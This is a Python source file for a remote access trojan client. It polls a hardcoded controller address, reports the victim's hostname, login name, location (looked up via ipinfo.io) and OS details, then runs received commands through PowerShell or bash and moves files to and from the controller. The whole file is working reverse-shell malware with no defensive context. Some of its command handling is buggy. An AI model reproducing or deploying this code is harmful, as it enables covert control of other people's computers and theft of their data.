import socket
import os
import subprocess
import json
import time
import requests
import platform
import threading


HOST = "192.168.0.104"
PORT = 6565
test_PORT = 2121
running =False



###################################################################################################
################                      send/recv                          ##########################
###################################################################################################

def resv(client):
    size = int(client.recv(4096).decode('utf-8'))
    enc = b''
    while len(enc) < size:
        enc += client.recv(4096)
    return enc.decode('utf-8')

def send(client,enc):
    size = str(len(enc.encode('utf-8')))
    client.send(size.encode('utf-8'))
    time.sleep(0.3)
    client.send(enc.encode('utf-8'))


###################################################################################################
################                     x                          ##########################
###################################################################################################

def check_status():
    try:
        hostname = socket.gethostname()
        test = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        test.connect((HOST,test_PORT))
        send(test,hostname)
        status = resv(test)
        return status
    except Exception as e:
        return e
    

def first_connect(client):
    send(client,socket.gethostname())
    answer = resv(client)
    ipinfo = json.loads(requests.get("https://ipinfo.io").content.decode())

    if answer == "whoareyou":
        print("hello")
        info = {
        "city": ipinfo["city"],
        "country" : ipinfo["country"],
        "username" : os.getlogin(),
        "system" : platform.uname().system,
        "machine": platform.uname().machine,
        "version": platform.uname().version,
        }
        info =json.dumps(info)
        send(client,info)




def connect(client):
    os_name = os.name
    while True:
        send(client,os.getcwd())
        
        command = resv(client).split()
        try:
            if command[0] == "cd":
                os.chdir(command.split(" ")[1])
            elif command == 'close':
                send(client,"[*] Connection closed !!!")
                break
            elif command[0] == "ftp":
                stdout = ftp(command,client)
                time.sleep(0.4)
                send(client,stdout)
                time.sleep(0.4)
                continue
            
            if os_name == "nt":
                stdout = subprocess.check_output(["powershell.exe", "-Command",command],shell=True)
            elif os_name == "posix":
                stdout = subprocess.check_output(["/bin/bash", "-c",command],shell=False)
                
        except :
            stdout = b"\033[32m[*] Command Not Found.\033[0m\n"
            
        if stdout:
            send(client,stdout.decode('utf-8'))
        else:
            send(client,"\n")
        time.sleep(0.3)
    
def ftp(command,client):
    tip = command[1]
    file = command[2]

    

    def download(file,client):
        size = resv(client)
        if size == -1:
            return "[*] Not found !!!"
        send(client,"Naber")
        while os.path.exists(file) : 
            file += '(new)'
        chunk = resv(client)
        with open(file,'wb') as f:
            f.write(chunk)
        return "[*] Data uploaded successful."

    def upload(file,client):
        try:
            with open(f"./{file}",'rb') as f:
                send(client,'1')
                resv(client)
                send(client,f.read())
            return "[*] Data downloaded successful."
        except:
            send(client,'-1')
            return "[*] Not found !!!"
            
    if tip == "-u":
        return download(file,client)
    elif tip == "-d":
        return upload(file,client)
    else :
        return "[*] Wrong command !!!"
    
def start_party():
    client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    client.connect((HOST,PORT))
    first_connect(client)
    while 1:
        command = resv(client)
        match command:
                case "connect":
                    connect(client)
                case "exit":
                    client.close()
                    break   
            
while True:
    # Timer = random.randit(20,200)
    Timer = 5
    time.sleep(Timer)
    status = check_status()
    print(status,running)
    if (status == "True" and running == False) or status == "-1":
        start_thread = threading.Thread(target=start_party)
        start_thread.start()
        running = True
    elif status == "False" and running == True:
        running = False